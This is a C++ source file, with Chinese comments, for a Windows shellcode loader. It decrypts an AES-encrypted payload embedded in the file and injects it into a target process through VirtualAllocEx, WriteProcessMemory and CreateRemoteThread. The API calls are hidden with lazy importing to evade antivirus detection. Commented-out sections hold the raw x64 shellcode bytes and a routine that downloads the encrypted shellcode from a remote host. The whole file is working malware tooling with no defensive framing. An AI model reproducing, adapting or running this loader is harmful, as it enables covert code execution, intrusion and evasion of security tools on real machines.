#define _CRT_SECURE_NO_DEPRECATE
#include "Windows.h"
#include "stdio.h"
#include "lazy_importer.hpp"
#include <tchar.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#define BUF_SIZE 4096

#include <iostream>
#include "AES.h"
#include "Base64.h"

using namespace std;

const char g_key[17] = "asdfwetyhjuytrfd";
const char g_iv[17] = "gfdertfghjkuyrtg";//ECB MODE不需要关心chain，可以填空

string EncryptionAES(const string& strSrc) //AES加密
{
	size_t length = strSrc.length();
	int block_num = length / BLOCK_SIZE + 1;
	//明文
	char* szDataIn = new char[block_num * BLOCK_SIZE + 1];
	memset(szDataIn, 0x00, block_num * BLOCK_SIZE + 1);
	strcpy(szDataIn, strSrc.c_str());

	//进行PKCS7Padding填充。
	int k = length % BLOCK_SIZE;
	int j = length / BLOCK_SIZE;
	int padding = BLOCK_SIZE - k;
	for (int i = 0; i < padding; i++)
	{
		szDataIn[j * BLOCK_SIZE + k + i] = padding;
	}
	szDataIn[block_num * BLOCK_SIZE] = '\0';

	//加密后的密文
	char* szDataOut = new char[block_num * BLOCK_SIZE + 1];
	memset(szDataOut, 0, block_num * BLOCK_SIZE + 1);

	//进行进行AES的CBC模式加密
	AES aes;
	aes.MakeKey(g_key, g_iv, 16, 16);
	aes.Encrypt(szDataIn, szDataOut, block_num * BLOCK_SIZE, AES::CBC);
	string str = base64_encode((unsigned char*)szDataOut,
		block_num * BLOCK_SIZE);
	delete[] szDataIn;
	delete[] szDataOut;
	return str;
}
string DecryptionAES(const string& strSrc) //AES解密
{
	string strData = base64_decode(strSrc);
	size_t length = strData.length();
	//密文
	char* szDataIn = new char[length + 1];
	memcpy(szDataIn, strData.c_str(), length + 1);
	//明文
	char* szDataOut = new char[length + 1];
	memcpy(szDataOut, strData.c_str(), length + 1);

	//进行AES的CBC模式解密
	AES aes;
	aes.MakeKey(g_key, g_iv, 16, 16);
	aes.Decrypt(szDataIn, szDataOut, length, AES::CBC);

	//去PKCS7Padding填充
	if (0x00 < szDataOut[length - 1] <= 0x16)
	{
		int tmp = szDataOut[length - 1];
		for (int i = length - 1; i >= length - tmp; i--)
		{
			if (szDataOut[i] != tmp)
			{
				memset(szDataOut, 0, length);
				cout << "去填充失败！解密出错！！" << endl;
				break;
			}
			else
				szDataOut[i] = 0;
		}
	}
	string strDest(szDataOut);
	delete[] szDataIn;
	delete[] szDataOut;
	return strDest;
}

LPSTR GetInterNetURLText(LPSTR lpcInterNetURL, char* buff)
{
	HINTERNET hSession;
	LPSTR lpResult = NULL;
	hSession = InternetOpen(_T("WinInet"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	__try
	{
		if (hSession != NULL)
		{
			HINTERNET hRequest;
			hRequest = InternetOpenUrlA(hSession, lpcInterNetURL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
			__try
			{
				if (hRequest != NULL)
				{
					DWORD dwBytesRead;
					char szBuffer[BUF_SIZE] = { 0 };

					if (InternetReadFile(hRequest, szBuffer, BUF_SIZE, &dwBytesRead))
					{
						RtlMoveMemory(buff, szBuffer, BUF_SIZE);
						return 0;
					}
				}
			}
			__finally
			{
				InternetCloseHandle(hRequest);
			}
		}
	}
	__finally
	{
		InternetCloseHandle(hSession);
	}
	return lpResult;
}

int main(int argc, char* argv[])
{
	// 原始shellcode
	//unsigned char buf[] =
	//	"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
	//	"\xff\xff\x48\xbb\x19\x5a\x0e\x8c\xb0\xca\x4b\xd7\x48\x31\x58"
	//	"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xe5\x12\x8d\x68\x40\x22"
	//	"\x8b\xd7\x19\x5a\x4f\xdd\xf1\x9a\x19\x86\x4f\x12\x3f\x5e\xd5"
	//	"\x82\xc0\x85\x79\x12\x85\xde\xa8\x82\xc0\x85\x39\x12\x85\xfe"
	//	"\xe0\x82\x44\x60\x53\x10\x43\xbd\x79\x82\x7a\x17\xb5\x66\x6f"
	//	"\xf0\xb2\xe6\x6b\x96\xd8\x93\x03\xcd\xb1\x0b\xa9\x3a\x4b\x1b"
	//	"\x5f\xc4\x3b\x98\x6b\x5c\x5b\x66\x46\x8d\x60\x41\xcb\x5f\x19"
	//	"\x5a\x0e\xc4\x35\x0a\x3f\xb0\x51\x5b\xde\xdc\x3b\x82\x53\x93"
	//	"\x92\x1a\x2e\xc5\xb1\x1a\xa8\x81\x51\xa5\xc7\xcd\x3b\xfe\xc3"
	//	"\x9f\x18\x8c\x43\xbd\x79\x82\x7a\x17\xb5\x1b\xcf\x45\xbd\x8b"
	//	"\x4a\x16\x21\xba\x7b\x7d\xfc\xc9\x07\xf3\x11\x1f\x37\x5d\xc5"
	//	"\x12\x13\x93\x92\x1a\x2a\xc5\xb1\x1a\x2d\x96\x92\x56\x46\xc8"
	//	"\x3b\x8a\x57\x9e\x18\x8a\x4f\x07\xb4\x42\x03\xd6\xc9\x1b\x56"
	//	"\xcd\xe8\x94\x12\x8d\x58\x02\x4f\xd5\xf1\x90\x03\x54\xf5\x7a"
	//	"\x4f\xde\x4f\x2a\x13\x96\x40\x00\x46\x07\xa2\x23\x1c\x28\xe6"
	//	"\xa5\x53\xc5\x0e\xbd\x38\xe5\x46\x69\x3c\x8c\xb0\x8b\x1d\x9e"
	//	"\x90\xbc\x46\x0d\x5c\x6a\x4a\xd7\x19\x13\x87\x69\xf9\x76\x49"
	//	"\xd7\x1d\x88\xce\x24\xee\x47\x0a\x83\x50\xd3\xea\xc0\x39\x3b"
	//	"\x0a\x6d\x55\x2d\x28\x8b\x4f\x1f\x07\x5e\xf3\x32\x0f\x8d\xb0"
	//	"\xca\x12\x96\xa3\x73\x8e\xe7\xb0\x35\x9e\x87\x49\x17\x3f\x45"
	//	"\xfd\xfb\x8b\x9f\xe6\x9a\x46\x05\x72\x82\xb4\x17\x51\xd3\xcf"
	//	"\xcd\x0a\x20\x44\x08\xf9\xa5\xdb\xc4\x39\x0d\x21\xc7\x58\x02"
	//	"\x42\x05\x52\x82\xc2\x2e\x58\xe0\x97\x29\xc4\xab\xb4\x02\x51"
	//	"\xdb\xca\xcc\xb2\xca\x4b\x9e\xa1\x39\x63\xe8\xb0\xca\x4b\xd7"
	//	"\x19\x1b\x5e\xcd\xe0\x82\xc2\x35\x4e\x0d\x59\xc1\x81\x0a\x21"
	//	"\xda\x40\x1b\x5e\x6e\x4c\xac\x8c\x93\x3d\x0e\x0f\x8d\xf8\x47"
	//	"\x0f\xf3\x01\x9c\x0e\xe4\xf8\x43\xad\x81\x49\x1b\x5e\xcd\xe0"
	//	"\x8b\x1b\x9e\xe6\x9a\x4f\xdc\xf9\x35\x83\x9a\x90\x9b\x42\x05"
	//	"\x71\x8b\xf1\xae\xd5\x65\x88\x73\x65\x82\x7a\x05\x51\xa5\xc4"
	//	"\x07\xbe\x8b\xf1\xdf\x9e\x47\x6e\x73\x65\x71\xbb\x62\xbb\x0c"
	//	"\x4f\x36\x16\x5f\xf6\x4a\xe6\x8f\x46\x0f\x74\xe2\x77\xd1\x65"
	//	"\x50\x8e\x77\x50\xbf\x4e\x6c\x5e\x49\x7c\xe3\xda\xca\x12\x96"
	//	"\x90\x80\xf1\x59\xb0\xca\x4b\xd7";


	
	////远程获取加密shellcode
	//char buf[BUF_SIZE] = { 0 };
	//char url[MAX_PATH] = "http://192.168.94.141:8000/buf.txt";
	//GetInterNetURLText(url, buf);

		
	// 加密后的shellcode
	char buf[BUF_SIZE] = "I8mLz2JN2G9JVrrDFi7LtccqhCU7uccBqZwB4PvkF7N+5iCaKiJR+LYI391ZFJS6ieyEDFLCaEnV6A0zq+P1uyW6HKEEaF4E9FRztJuTLhiukABcgx0z0b9IeGWPLjRS+QywJoEpMZJtJwIDCiF+NRme/Y56ZUZtR2VKf2ZbjndrGmtVlNlWgG1+3noUS+fOqeW+EzflCLQl+ysXmBsaFXunsxpQGiYt2D6nuZ6ZWitp2HnGo/XdpKyOp6EXV5DczC5MOJQWDrog2nATb3uEibBV17OIldHyfTnAENOFMnI0H3L/Rg8oaBKC/Ab0ZVWtlerqfNwxeozb81c6KMfnFsEzxX2Bx1ZYU4LCJfkkAmDfZzDYuko/h7fbuf+9tnjOhsIF3v7Vlf0YVfkb4Spzrg/Ze9BqGU0He9aUpStXvJhTDuQQAOlXxexkK5Ve50T15fGh3VjfairouotBjLPvrRJI7pP821ZAxFJO2mZGwNDJrM8Bhw9+7Ia+bz9V6mMwKmnHwZixT1HKrYnPx68kVWrgWIE3bTUfYYl4RHSerCLT0fBTK+fQg8QEDnMDZJEkR/lbtg7dy4Mxvdo5Bct6dQsg8NymqQRZ2QAM8MgzbxbeozLYKx+s1n5pmxnVY9btuOFWXfWl5+sP49PnExHb8x4SFU0WamL/ChasjDxyQ7jA2u/ezxhFjKW8AsUGxMF5bdXJnY/I5373nCt+Sl2a6q80CFYzZ7IbipLhtBAwUlbURS5hZ/dXcRI8BXsOhcBhglCjCGA0gjO7W7Cp7Icbet+dhYsrhXq+0R0IkrQ6Q5e/gA9AVP60C8aKxLYyeumedE0M9bcg8w6gDwCGsQ9xMzn97sDuqxR0a5a0OT81Veqqp+HQZ9OBiqusDg6eX/mry32sWdgHGemMS9q4F8GX7yd4amxcnfBwJn7n+6E96GBTlF6QzRMfsol5QG0oEF/QvNZGYz3L6ALme8YW6/6U6NznUEFj+Fcg/tivRuX83VDWMP4OW2qydM7kIHY/RXWTDO912FdiBdDbIniVE+q/RQL8UY9W+OqcUm2+P91QSlUGY+CEm14JGbbneMxHoIBMUX9EigHNiHldTzhjA2Vzfsh4DpEU164xK8HrXmnoya0wvAt36MBpidTksvOjzUhLynPkarjK+cYtxxSUpTkQFP+g/Umfx0k7wWp1EIemssWBx51TiOKvZUFxS36q0tddR4CxFIZ1yTYGswyHnj6ffhoGtCpG1/RVy2Hw22Abl0YoeEzG3QM5TyknLGILspCb+zULv/jgGVmK17CBq00dNcHiT1s79l3ek893nzoif4EdBpEqayyczbbuymPfq2Bx";


	// 解密shellcode
	string strbuf = DecryptionAES(buf);
	//cout << "解密后shellcode：" << strbuf << endl;
	char buff[BUF_SIZE] = { 0 };
	for (int i = 0; i < strbuf.length(); i++) {
		buff[i] = strbuf[i];
	}
		
	// shellcode 处理，两个两个一起，还原成 \x00 的样子
	char* p = buff;
	unsigned char* shellcode = (unsigned char*)calloc(strlen(buff) / 2, sizeof(unsigned char));
	for (size_t i = 0; i < strlen(buff) / 2; i++) {
		sscanf(p, "%2hhx", &shellcode[i]);
		p += 2;
	}


	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	SIZE_T bufSize = strlen(buff) / 2;
	
	//printf("Decrypted buffer:\n");
	//for (int i = 0; i < bufSize; i++) {
	//	printf("\\x%02x", shellcode[i]);
	//}

	printf("Injecting to PID: %i", atoi(argv[1]));
	processHandle = LI_FN(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

	//processHandle = LI_FN(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, DWORD(2052));
	remoteBuffer = LI_FN(VirtualAllocEx)(processHandle, nullptr, bufSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	LI_FN(WriteProcessMemory)(processHandle, remoteBuffer, shellcode, bufSize, nullptr);
	remoteThread = LI_FN(CreateRemoteThread)(processHandle, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, nullptr, 0, nullptr);
	LI_FN(CloseHandle)(processHandle);


	//// 本地 test
	//unsigned char buf[] = "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\x19\x5a\x0e\x8c\xb0\xca\x4b\xd7\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xe5\x12\x8d\x68\x40\x22\x8b\xd7\x19\x5a\x4f\xdd\xf1\x9a\x19\x86\x4f\x12\x3f\x5e\xd5\x82\xc0\x85\x79\x12\x85\xde\xa8\x82\xc0\x85\x39\x12\x85\xfe\xe0\x82\x44\x60\x53\x10\x43\xbd\x79\x82\x7a\x17\xb5\x66\x6f\xf0\xb2\xe6\x6b\x96\xd8\x93\x03\xcd\xb1\x0b\xa9\x3a\x4b\x1b\x5f\xc4\x3b\x98\x6b\x5c\x5b\x66\x46\x8d\x60\x41\xcb\x5f\x19\x5a\x0e\xc4\x35\x0a\x3f\xb0\x51\x5b\xde\xdc\x3b\x82\x53\x93\x92\x1a\x2e\xc5\xb1\x1a\xa8\x81\x51\xa5\xc7\xcd\x3b\xfe\xc3\x9f\x18\x8c\x43\xbd\x79\x82\x7a\x17\xb5\x1b\xcf\x45\xbd\x8b\x4a\x16\x21\xba\x7b\x7d\xfc\xc9\x07\xf3\x11\x1f\x37\x5d\xc5\x12\x13\x93\x92\x1a\x2a\xc5\xb1\x1a\x2d\x96\x92\x56\x46\xc8\x3b\x8a\x57\x9e\x18\x8a\x4f\x07\xb4\x42\x03\xd6\xc9\x1b\x56\xcd\xe8\x94\x12\x8d\x58\x02\x4f\xd5\xf1\x90\x03\x54\xf5\x7a\x4f\xde\x4f\x2a\x13\x96\x40\x00\x46\x07\xa2\x23\x1c\x28\xe6\xa5\x53\xc5\x0e\xbd\x38\xe5\x46\x69\x3c\x8c\xb0\x8b\x1d\x9e\x90\xbc\x46\x0d\x5c\x6a\x4a\xd7\x19\x13\x87\x69\xf9\x76\x49\xd7\x1d\x88\xce\x24\xee\x47\x0a\x83\x50\xd3\xea\xc0\x39\x3b\x0a\x6d\x55\x2d\x28\x8b\x4f\x1f\x07\x5e\xf3\x32\x0f\x8d\xb0\xca\x12\x96\xa3\x73\x8e\xe7\xb0\x35\x9e\x87\x49\x17\x3f\x45\xfd\xfb\x8b\x9f\xe6\x9a\x46\x05\x72\x82\xb4\x17\x51\xd3\xcf\xcd\x0a\x20\x44\x08\xf9\xa5\xdb\xc4\x39\x0d\x21\xc7\x58\x02\x42\x05\x52\x82\xc2\x2e\x58\xe0\x97\x29\xc4\xab\xb4\x02\x51\xdb\xca\xcc\xb2\xca\x4b\x9e\xa1\x39\x63\xe8\xb0\xca\x4b\xd7\x19\x1b\x5e\xcd\xe0\x82\xc2\x35\x4e\x0d\x59\xc1\x81\x0a\x21\xda\x40\x1b\x5e\x6e\x4c\xac\x8c\x93\x3d\x0e\x0f\x8d\xf8\x47\x0f\xf3\x01\x9c\x0e\xe4\xf8\x43\xad\x81\x49\x1b\x5e\xcd\xe0\x8b\x1b\x9e\xe6\x9a\x4f\xdc\xf9\x35\x83\x9a\x90\x9b\x42\x05\x71\x8b\xf1\xae\xd5\x65\x88\x73\x65\x82\x7a\x05\x51\xa5\xc4\x07\xbe\x8b\xf1\xdf\x9e\x47\x6e\x73\x65\x71\xbb\x62\xbb\x0c\x4f\x36\x16\x5f\xf6\x4a\xe6\x8f\x46\x0f\x74\xe2\x77\xd1\x65\x50\x8e\x77\x50\xbf\x4e\x6c\x5e\x49\x7c\xe3\xda\xca\x12\x96\x90\x80\xf1\x59\xb0\xca\x4b\xd7";
	//HANDLE processHandle;
	//HANDLE remoteThread;
	//PVOID remoteBuffer;

	//processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(10216));
	//remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof buf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	//WriteProcessMemory(processHandle, remoteBuffer, buf, sizeof buf, NULL);
	//remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	//CloseHandle(processHandle);

	return 0;
}